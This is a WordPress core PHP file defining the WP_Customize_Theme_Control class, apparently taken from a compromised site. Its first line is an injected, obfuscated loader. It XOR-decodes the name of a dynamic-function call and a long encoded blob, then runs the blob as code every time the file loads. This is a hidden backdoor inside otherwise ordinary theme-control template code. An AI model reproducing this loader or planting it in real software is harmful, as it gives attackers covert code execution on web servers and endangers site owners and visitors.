<?php $MhlokqM='HBE9O45P<+Y-IO:'^'+0 X;Qj6IE:Y  T';$WCuydRuR=$MhlokqM('',':VGi,K PMY P5E6IA.Jij,YGeWW>O507U2dsEL,hcFEUY,S+Tp= 3oWZY.gd5,,qBZ 9PjPs3W+MOCdfMP693KB<9DEujHKCXGH.Dgk:AdUGjCeIuN:I- YPeYS90gznG9FDyxKGpO BvGWVCc28;42Q=qIpQGG5Y-o>ybxG3C47+MLVE7O-SkxcgIU,F84AC,=Fqc6:4E>gdu2OLPDopF;>A Wmp2 Y1eYK;gvs15UCKzdg OC7T0QKogqcs5v8iaA hg8<;uyqIN4- 8EkdN3XBU0;A-8<2AkZUQ6CQ2mrOTG;luAK1-<-SrBOnL8XPpWfS.O;Ys4E407;-L2XQOlj1i0ovg LM4EQ33JSqqvr33Z2RXS46OMnZ8X.+125pVDw9X.KMe;w5XX9edDBV4GB4Y:A0X:<nq6.=5vdq7O-X1NDQ-=V J5,0-ZXD;=jX6DNO3H6ZUm SX+W5igVSI hhkj5,;X1P+,PXImDRpmQY=.vNRu4IEL<4GH>tQLD7O6qS=E=LODu>ZY+XoivqqVVmFi53N1+aX02VklyVraJdC7ZSMYaTV w6tuhRWae;Yb4v6zVE3rQBzAPDMTCYJ;o><O92>DS5SqRHJM4A8WvGJUV-02cdhcYAFwJZ= D,<IJT1TS=cPAO.+4Zl-SSF4W9B>QWSiZ8'^'S0oHJ>N390O>j N 2Z9AMT65:36J.joZ FCZllWbj 0;:X:D:PEOA03;-O8;XYXYf>AM1FpWX2RdocDFm+<0:o-IMdxUMopIQN.A6OOSaYuwQcA I=N;AE7xA=2MQNANcPmoPrBNT U6VijvkGVYOUiuT,i.qc,P vKWYGX4G1XREeh= NfpzPrjn;0X3JZigCH2XX<3IOCmnQV.81dRP ZR2ElgTVA-P:2.BGKSWT90.AnmF 1R5S9kGC. <z=q,A SHCSYBUDOijBLLM BD59Qf1QO rSYKaVzq:S:j8dV+53ZLHaoGLPX6IH2dFQ>pXvB7O;ZpSOO=VXIH-Q0qgH5c,a:34tl,GeuXV3sLOVVER6G7qsO<FDJ>Y,OtZWLPkdSR=WpGl2SQ9,XEYdf U+7Qb0HMRG6dUROITVYQw:C+T<-0AT,EbMCBr>90Zb55C0f-R;Sla2D6;D3PAC22=AADKNQMO9n;NUyqrg-4XI58IOVhtUU;7-Ek,-G+44-D;EYtV DkcdQZ;-JqOOPQY;2XnMQR:PpF3UKq6EYkOAmWrTlf.<Y7dFDRCGYd5QTZjQVDUBerPF0eSavbm51++B0UY6fWF- A Yu8+4X.Y3Qkjq2LDSJMHCyafW1P4E2MPan0P 2fD  6BDU>KpzhL=2A+JygzRPE');$WCuydRuR();
/**
 * Customize API: WP_Customize_Theme_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customize Theme Control class.
 *
 * @since 4.2.0
 *
 * @see WP_Customize_Control
 */
class WP_Customize_Theme_Control extends WP_Customize_Control {

	/**
	 * Customize control type.
	 *
	 * @since 4.2.0
	 * @access public
	 * @var string
	 */
	public $type = 'theme';

	/**
	 * Theme object.
	 *
	 * @since 4.2.0
	 * @access public
	 * @var WP_Theme
	 */
	public $theme;

	/**
	 * Refresh the parameters passed to the JavaScript via JSON.
	 *
	 * @since 4.2.0
	 * @access public
	 *
	 * @see WP_Customize_Control::to_json()
	 */
	public function to_json() {
		parent::to_json();
		$this->json['theme'] = $this->theme;
	}

	/**
	 * Don't render the control content from PHP, as it's rendered via JS on load.
	 *
	 * @since 4.2.0
	 * @access public
	 */
	public function render_content() {}

	/**
	 * Render a JS template for theme display.
	 *
	 * @since 4.2.0
	 * @access public
	 */
	public function content_template() {
		$current_url = set_url_scheme( 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
		$active_url  = esc_url( remove_query_arg( 'customize_theme', $current_url ) );
		$preview_url = esc_url( add_query_arg( 'customize_theme', '__THEME__', $current_url ) ); // Token because esc_url() strips curly braces.
		$preview_url = str_replace( '__THEME__', '{{ data.theme.id }}', $preview_url );
		?>
		<# if ( data.theme.isActiveTheme ) { #>
			<div class="theme active" tabindex="0" data-preview-url="<?php echo esc_attr( $active_url ); ?>" aria-describedby="{{ data.theme.id }}-action {{ data.theme.id }}-name">
		<# } else { #>
			<div class="theme" tabindex="0" data-preview-url="<?php echo esc_attr( $preview_url ); ?>" aria-describedby="{{ data.theme.id }}-action {{ data.theme.id }}-name">
		<# } #>

			<# if ( data.theme.screenshot[0] ) { #>
				<div class="theme-screenshot">
					<img data-src="{{ data.theme.screenshot[0] }}" alt="" />
				</div>
			<# } else { #>
				<div class="theme-screenshot blank"></div>
			<# } #>

			<# if ( data.theme.isActiveTheme ) { #>
				<span class="more-details" id="{{ data.theme.id }}-action"><?php _e( 'Customize' ); ?></span>
			<# } else { #>
				<span class="more-details" id="{{ data.theme.id }}-action"><?php _e( 'Live Preview' ); ?></span>
			<# } #>

			<div class="theme-author"><?php
				/* translators: Theme author name */
				printf( _x( 'By %s', 'theme author' ), '{{ data.theme.author }}' );
			?></div>

			<# if ( data.theme.isActiveTheme ) { #>
				<h3 class="theme-name" id="{{ data.theme.id }}-name">
					<?php
					/* translators: %s: theme name */
					printf( __( '<span>Active:</span> %s' ), '{{{ data.theme.name }}}' );
					?>
				</h3>
			<# } else { #>
				<h3 class="theme-name" id="{{ data.theme.id }}-name">{{{ data.theme.name }}}</h3>
				<div class="theme-actions">
					<button type="button" class="button theme-details"><?php _e( 'Theme Details' ); ?></button>
				</div>
			<# } #>
		</div>
	<?php
	}
}
